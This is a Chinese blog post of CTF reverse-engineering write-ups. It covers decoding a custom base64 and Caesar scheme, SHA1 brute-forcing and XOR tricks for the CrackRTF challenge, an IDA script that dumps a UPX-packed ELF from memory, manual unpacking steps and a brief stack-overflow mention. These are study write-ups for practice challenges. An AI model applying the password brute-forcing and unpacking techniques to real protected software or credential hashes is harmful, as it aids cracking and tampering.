class="line">        <span class="comment"># 取三个字节，以每6比特，转换为4个整数</span></span><br><span class="line">        <span class="comment"># 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充.</span></span><br><span class="line">    <span class="keyword">return</span> rend(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rend</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encodeCh</span>(<span class="params">ch</span>):</span><br><span class="line">        f = <span class="keyword">lambda</span> x: <span class="built_in">chr</span>((<span class="built_in">ord</span>(ch) - x + <span class="number">2</span>) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">if</span> ch.islower():  <span class="comment">#检测字符是否都是小写 </span></span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">97</span>)</span><br><span class="line">        <span class="keyword">if</span> ch.isupper():  <span class="comment">#检测字符是否都是大写</span></span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">65</span>)</span><br><span class="line">        <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&#x27;&#x27;</span>).join(encodeCh(c) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br></pre></td></tr></table></figure></div>

<p>解读代码后直接写解密脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"></span><br><span class="line">c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&#x27;()&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;BozjB3vlZ3ThBn9bZ2jhOH93ZaH9&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rend</span>(<span class="params">ch</span>):</span><br><span class="line">        f = <span class="keyword">lambda</span> x: <span class="built_in">chr</span>((<span class="built_in">ord</span>(ch) - x + <span class="number">2</span>) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">if</span> ch.islower():  <span class="comment">#检测字符是否都是小写 </span></span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">97</span>)</span><br><span class="line">        <span class="keyword">if</span> ch.isupper():  <span class="comment">#检测字符是否都是大写</span></span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">65</span>)</span><br><span class="line">        <span class="keyword">return</span> ch</span><br><span class="line">    </span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> flag:</span><br><span class="line">    tmp+=rend(ch)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(tmp))</span><br><span class="line"></span><br><span class="line"><span class="comment">##中间的是base64加密 是可以看出来的 先得到后面加密后的密文 再进行base64的解密</span></span><br><span class="line"><span class="comment">##需要注意的是别把文件起叫base64.py ！！会和模块包名字起冲突！！</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h4 id="第二种思路"><a href="#第二种思路" class="headerlink" title="第二种思路"></a>第二种思路</h4><p>分为两段代码 一段是换表的base64加密，另一段是位移两位的凯撒密码加密</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + &#x27;()&#x27;</span><br><span class="line">flag = &#x27;BozjB3vlZ3ThBn9bZ2jhOH93ZaH9&#x27;</span><br><span class="line"></span><br><span class="line">def encode(origin_bytes):</span><br><span class="line">    c_bytes = [ (&#x27;&#123;:0&gt;8&#125;&#x27;).format(str(bin(b)).replace(&#x27;0b&#x27;, &#x27;&#x27;)) for b in origin_bytes ]</span><br><span class="line">    #将每一位bytes转换为二进制字符串 8位数字右对齐</span><br><span class="line">    </span><br><span class="line">    resp = &#x27;&#x27;</span><br><span class="line">    nums = len(c_bytes) // 3</span><br><span class="line">    remain = len(c_bytes) % 3</span><br><span class="line">    </span><br><span class="line">    integral_part = c_bytes[0:3 * nums]</span><br><span class="line">    while integral_part:</span><br><span class="line">        # 取三个字节，以每6比特，转换为4个整数</span><br><span class="line">        tmp_unit = (&#x27;&#x27;).join(integral_part[0:3])</span><br><span class="line">        tmp_unit = [ int(tmp_unit[x:x + 6], 2) for x in [0, 6, 12, 18] ]</span><br><span class="line">        # 取对应base64字符</span><br><span class="line">        resp += (&#x27;&#x27;).join([ c_charset[i] for i in tmp_unit ])</span><br><span class="line">        integral_part = integral_part[3:]</span><br><span class="line"></span><br><span class="line">    if remain:</span><br><span class="line">        remain_part = (&#x27;&#x27;).join(c_bytes[3 * nums:]) + (3 - remain) * &#x27;0&#x27; * 8</span><br><span class="line">        # 补齐三个字节，每个字节补充 0000 0000</span><br><span class="line">        tmp_unit = [ int(remain_part[x:x + 6], 2) for x in [0, 6, 12, 18] ][:remain + 1]</span><br><span class="line">        resp += (&#x27;&#x27;).join([ c_charset[i] for i in tmp_unit ]) + (3 - remain) * &#x27;.&#x27;</span><br><span class="line">        # 取三个字节，以每6比特，转换为4个整数</span><br><span class="line">        # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充.</span><br><span class="line">    return rend(resp)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def rend(s):</span><br><span class="line"></span><br><span class="line">    def encodeCh(ch):</span><br><span class="line">        f = lambda x: chr((ord(ch) - x + 2) % 26 + x)</span><br><span class="line">        if ch.islower():  #检测字符是否都是小写 </span><br><span class="line">            return f(97)</span><br><span class="line">        if ch.isupper():  #检测字符是否都是大写</span><br><span class="line">            return f(65)</span><br><span class="line">        return ch</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>反过来就是先将 ‘BozjB3vlZ3ThBn9bZ2jhOH93ZaH9’ 凯撒密码位移两位解码，再base64换表解密 得到flag</p>
<h1 id="CTFSHOW-BUUCTF-20230412"><a href="#CTFSHOW-BUUCTF-20230412" class="headerlink" title="CTFSHOW-BUUCTF-20230412"></a>CTFSHOW-BUUCTF-20230412</h1><h2 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h2><p>加密算法的标识码：<br><a class="link"   target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/seccrypto/alg-id" >https://learn.microsoft.com/en-us/windows/win32/seccrypto/alg-id <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681387669789-d531d758-1613-4374-b0fa-34ac942de123.png"
                      alt="image.png"
                ><br>读反汇编代码<br>发现主要的思路就是上图这样，输入两次密码，分别定义为：input_1和input_2<br>input_1输入后会进行一次加密，进入加密算法，通过0x8004u知道该密码标识符是sha1加密算法，即input_1+“@DBApp”赋值input_1&#x3D;&#x3D;SHA1&#x3D;&#x3D;&gt; “6E32D0943418C2C33385BC35A1470250DD8923A9”<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681387794231-3cf55ef5-c561-4f94-9379-4a3bd5e6d426.png"
                      alt="image.png"
                ><br>写出碰撞的加密脚本</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag2=<span class="string">&#x27;@DBApp&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">999999</span>):</span><br><span class="line">    h2 = hashlib.<span class="built_in">sha1</span>((<span class="built_in">str</span>(i)+flag2).<span class="built_in">encode</span>(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    flags = h2.<span class="built_in">hexdigest</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span> == flags: ##全小写</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(i)+flag2) </span><br><span class="line">            <span class="built_in">print</span>(flags)</span><br></pre></td></tr></table></figure></div>

<p>同样的方法，找到密码标识符后，确定是MD5加密方法，接着向下input_2+前面的input_1（加上“@DBApp”后）&#x3D;&#x3D;MD5&#x3D;&#x3D;&gt; “27019e688a4e62a649fd99cadaafdb4e” 求得input_2&#x3D;&#x3D; “<del>!3a@0”   (爆破的方法似乎行不通，不知道为啥这个<a class="link"   target="_blank" rel="noopener" href="https://www.somd5.com/" >MD5破解网站  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>可以 magic</del>)<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681388197504-58b2fddf-ba1f-4a53-b40a-fdda82175202.png"
                      alt="image.png"
                ><br>得到dbapp.rtf文件获得flag文件<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681388244869-3767b3f8-188f-4c68-bf99-0e0427084ef3.png"
                      alt="image.png"
                ></p>
<hr>
<p>存在的非预期解是在最后的函数里，存在一个调用函数<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681388309249-d126b2a2-50d9-4400-8156-4bb3a33b6fbe.png"
                      alt="image.png"
                ><br>一个一个去查函数的作用，主要作用是将一个资源中的数据写入到一个名为”dbapp.rtf“文件中去，其他各个函数的含义：<br>FindResourceA 查找资源 参数包括资源 ID (0x65) 和资源类型 (“AAA”)。<br>SizeofResource 获取资源的大小 LoadResource 加载资源 LockResource 锁定资源<br>调用另一个函数 sub_401005，作用是将第一个参数 lpString 中的字符串与 lpBuffer 中的数据进行处理，即与前6个字符的异或，并将处理结果存储到 lpBuffer 中。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681390515436-78837483-4443-4bc8-b766-ac8f1a43a215.png"
                      alt="image.png"
                ></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">passwd1 = <span class="string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span></span><br><span class="line">passwd2 = <span class="string">&quot;27019e688a4e62a649fd99cadaafdb4e&quot;</span></span><br><span class="line">suffix = <span class="string">&quot;@DBApp&quot;</span></span><br><span class="line">aaa = [<span class="number">0x5</span>, <span class="number">0x7d</span>, <span class="number">0x41</span>, <span class="number">0x15</span>, <span class="number">0x26</span>, <span class="number">0x1</span>]	<span class="comment">#AAA资源的前6个字节</span></span><br><span class="line">rtf_header = [<span class="number">0x7b</span>, <span class="number">0x5c</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x31</span>] <span class="comment"># RTF文件头前6给字节</span></span><br><span class="line"></span><br><span class="line">pass1 = <span class="string">&quot;&quot;</span></span><br><span class="line">pass2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">1000000</span>):</span><br><span class="line">    instr = <span class="built_in">str</span>(i) + suffix</span><br><span class="line">    res = hashlib.sha1(instr.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> res == passwd1:</span><br><span class="line">        pass1 = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd1 = &quot;</span>, pass1)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    res = aaa[i] ^ rtf_header[i]</span><br><span class="line">    pass2 += <span class="built_in">chr</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;passwd2 = &quot;</span>, pass2)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="CTFSHOW-二进制玩家人均全栈"><a href="#CTFSHOW-二进制玩家人均全栈" class="headerlink" title="CTFSHOW 二进制玩家人均全栈"></a>CTFSHOW 二进制玩家人均全栈</h1><p>首先得到的是一个名叫zip的文件，用010打开查看，发现是个PK文件头的压缩文件，但是发现是的与正常压缩包文件的前几个字节存在偏差，所以需要手动修复文件<br>修改前文件<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681537591631-288e8a81-1be4-479e-9791-e32ff7368ef9.png"
                      alt="image.png"
                ><br>修改后的文件<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681538025106-3f33f9bf-d93f-41b6-9802-fa97ba2bc659.png"
                      alt="image.png"
                ><br>个人觉得这一步不需要 ，14 00两位是使用的PKware的版本，08 00判断是否有加密，如果直接用更改后缀名的方式也是可以实现的<br>解出一个无后缀的文件，放在ubantu发现执行不了这个文件，原因是文件头错误，所以需要更改文件头继续执行文件。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681539824669-62456b75-dac2-4f38-8fc4-2a464ea1c21e.png"
                      alt="image.png"
                ><br>查看原来文件头的数据，并更改成正确的elf文件的文件头</p>
<blockquote>
<p>PE文件文件头数据是：<code>4D 5A 90 00</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681540707194-721297a9-68bf-4b93-8bab-6d7b5a926106.png"
                      alt="image.png"
                ><br>ELF文件文件头数据是：<code>7F 45 4C 46</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681540749100-142f0174-8057-404a-a124-2e602ed8f2c2.jpeg"
                      alt="v2-80cb4f8fe1c2f4225bac1b2147cfab5b_720w.jpg"
                ><br>电脑暂时没有ELF文件，盗了张图（<a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/602763051" >原链接戳这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
</blockquote>
<p>更改后重新测试，说明文件就改好了撒花(误<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681540912161-481ecd58-fb69-4500-9b51-1b82af9bb6ab.png"
                      alt="image.png"
                ><br>之后正常地分析文件，发现还需要将upx壳脱掉，自动脱壳。。。脱不掉。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681555655997-7bfb4b74-17fc-46bd-be51-404b6a34114c.png"
                      alt="image.png"
                ></p>
<h4 id="planA-dumpfile脚本脱壳"><a href="#planA-dumpfile脚本脱壳" class="headerlink" title="planA:dumpfile脚本脱壳"></a>planA:dumpfile脚本脱壳</h4><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_LOAD              1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_DYNAMIC           2</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">auto</span> ImageBase,StartImg,EndImg;</span><br><span class="line">         <span class="keyword">auto</span> e_phoff;</span><br><span class="line">         <span class="keyword">auto</span> e_phnum,p_offset;</span><br><span class="line">         <span class="keyword">auto</span> i,dumpfile;</span><br><span class="line">         ImageBase=<span class="number">0x400000</span>;</span><br><span class="line">         StartImg=<span class="number">0x400000</span>;</span><br><span class="line">         EndImg=<span class="number">0x0</span>;</span><br><span class="line">         <span class="keyword">if</span> (<span class="built_in">Dword</span>(ImageBase)==<span class="number">0x7f454c46</span> || <span class="built_in">Dword</span>(ImageBase)==<span class="number">0x464c457f</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(dumpfile=<span class="built_in">fopen</span>(<span class="string">&quot;C:\\TOOLS\\dumpfile&quot;</span>,<span class="string">&quot;wb&quot;</span>)) <span class="comment">//需要更改文件的路径(若没有的需要新建dumpfile无后缀文件,双斜线)</span></span><br><span class="line">    &#123;</span><br><span class="line">      e_phoff=ImageBase+<span class="built_in">Qword</span>(ImageBase+<span class="number">0x20</span>);</span><br><span class="line">      <span class="built_in">Message</span>(<span class="string">&quot;e_phoff = 0x%x\n&quot;</span>, e_phoff);</span><br><span class="line">      e_phnum=<span class="built_in">Word</span>(ImageBase+<span class="number">0x38</span>);</span><br><span class="line">      <span class="built_in">Message</span>(<span class="string">&quot;e_phnum = 0x%x\n&quot;</span>, e_phnum);</span><br><span class="line">      <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;e_phnum;i++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="built_in">Dword</span>(e_phoff)==PT_LOAD || <span class="built_in">Dword</span>(e_phoff)==PT_DYNAMIC)</span><br><span class="line">                         &#123; </span><br><span class="line">                                 p_offset=<span class="built_in">Qword</span>(e_phoff+<span class="number">0x8</span>);</span><br><span class="line">                                 StartImg=<span class="built_in">Qword</span>(e_phoff+<span class="number">0x10</span>);</span><br><span class="line">                                 EndImg=StartImg+<span class="built_in">Qword</span>(e_phoff+<span class="number">0x28</span>);</span><br><span class="line">                                 <span class="built_in">Message</span>(<span class="string">&quot;start = 0x%x, end = 0x%x, offset = 0x%x\n&quot;</span>, StartImg, EndImg, p_offset);</span><br><span class="line">                                 <span class="built_in">dump</span>(dumpfile,StartImg,EndImg,p_offset);</span><br><span class="line">                                 <span class="built_in">Message</span>(<span class="string">&quot;dump segment %d ok.\n&quot;</span>,i);</span><br><span class="line">                         &#125;    </span><br><span class="line">         e_phoff=e_phoff+<span class="number">0x38</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fseek</span>(dumpfile,<span class="number">0x3c</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fseek</span>(dumpfile,<span class="number">0x28</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fclose</span>(dumpfile);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="built_in">Message</span>(<span class="string">&quot;dump err.&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">dump</span><span class="params">(dumpfile,startimg,endimg,offset)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> i;</span><br><span class="line">        <span class="keyword">auto</span> size;</span><br><span class="line">        size=endimg-startimg;</span><br><span class="line">        <span class="built_in">fseek</span>(dumpfile,offset,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> ( i=<span class="number">0</span>; i &lt; size; i=i+<span class="number">1</span> ) </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">fputc</span>(<span class="built_in">Byte</span>(startimg+i),dumpfile);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>下断点进行动态调式，找到oep(程序的入口点 <a class="link"   target="_blank" rel="noopener" href="https://baike.baidu.com/item/OEP/4885720?fr=aladdin" >What is OEP？ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br>首先，retn指令下断点F9跳到断点处<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681553621822-e17a2b26-e615-41ca-b2be-12b49ff7c29f.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681553690818-5fccf4f1-24bd-4513-bb0d-2922dd5f0b24.png"
                      alt="3032507-20230208105713953-267849918.png"
                ><br>1.F8单步执行，找下一个retn指令<br>2.在retn处下断点，F9跳过，F8单步<br>3.继续向下找retn重复2步骤<br>重复个几次，之后一直F8，最终到达这里。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681554012163-4de2fa74-465e-4c60-9155-74b429ed66a4.png"
                      alt="3032507-20230208105137216-81322655.png"
                ><br>后面是一次大跳转，就会跳到OEP处，接着F8来到下图的位置<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681554075656-b392fc08-b198-453d-97cc-679c6af46097.png"
                      alt="image.png"
                ><br>继续执行到返回弹窗<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681554122591-4b7c66a4-8f27-478c-99a4-dc6861d454a2.png"
                      alt="3032507-20230208105906624-210014495.png"
                ><br>提示是返回的地方没有被定义为代码，问是否需要定义，选择Yes<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681554182408-b3dfa132-732b-4b36-a38f-27cbc8aa0321.png"
                      alt="image.png"
                ><br>这样就来到了OEP的位置<br>快捷键alt+F7点击上面的脚本，运行成功得到的dump文件就是最后我们需要的内存文件。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681549221746-300062d3-eb60-4182-968c-cd5ec1824cd1.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681549290571-310a7949-b7d9-43ff-9035-1f53b12e01eb.png"
                      alt="image.png"
                ><br>提示运行成功，报错<code>dump err</code>就检查之前设置的dump文件路径有没有错误的，这种方法获得是加壳之前的内存文件，转移到了dump文件中，接下来分析的就是路径下的dump文件了。</p>
<h4 id="planB-魔改UPX壳"><a href="#planB-魔改UPX壳" class="headerlink" title="planB:魔改UPX壳"></a>planB:魔改UPX壳</h4><p>已经判断了该程序的壳是UPX 但在010中会发现有vmp的壳，所以将upx壳的特征值改回来，之后再用机器脱壳<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681561295863-eef13c47-cdfd-4f0d-8b70-e06063721c56.png"
                      alt="dbe259f3726f4b2199fd41878c5f5655.png"
                ></p>
<h4 id="planC-其他方法"><a href="#planC-其他方法" class="headerlink" title="planC:其他方法"></a>planC:其他方法</h4><blockquote>
<p>方法1：单步跟踪<br>只向下调不向上调<br>方法2：ESP定律法<br>dd XXXXX<br>hr XXXXX<br>方法3：2次内存镜像法<br>方法4：一步直达法</p>
</blockquote>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46296905/article/details/116049504" >https://blog.csdn.net/m0_46296905&#x2F;article&#x2F;details&#x2F;116049504 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681555194523-9b391741-4a1f-424b-920b-f1051b16d8d0.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681555208977-9e8b86cf-3c72-45e2-8971-9e00a99ec318.png"
                      alt="image.png"
                ><br>最后明显就是迷宫路线题，套路套路答案就出了，之前又搞过就不写了<br><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/r136a1/p/17101192.html" >https://www.cnblogs.com/r136a1/p/17101192.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53349587/article/details/124676648" >https://blog.csdn.net/weixin_53349587&#x2F;article&#x2F;details&#x2F;124676648 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h1 id="CTFSHOW-9月刷题"><a href="#CTFSHOW-9月刷题" class="headerlink" title="CTFSHOW-9月刷题"></a>CTFSHOW-9月刷题</h1><p>密文解密网站：<br><a class="link"   target="_blank" rel="noopener" href="https://txtmoji.com/" >https://txtmoji.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="pwn02"><a href="#pwn02" class="headerlink" title="pwn02"></a>pwn02</h2><p>栈溢出的题，直接接收溢出的字符串即可获得服务器权限</p>
